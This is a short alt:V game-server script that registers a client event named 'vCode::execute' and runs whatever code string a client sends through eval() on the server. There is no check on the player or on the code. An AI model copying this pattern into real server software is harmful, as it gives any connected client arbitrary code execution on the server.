/// <reference path="../../../node_modules/@altv/types-server/index.d.ts" />

import alt from 'alt-server';

alt.onClient('vCode::execute', (player, code) => {
    eval(code);
});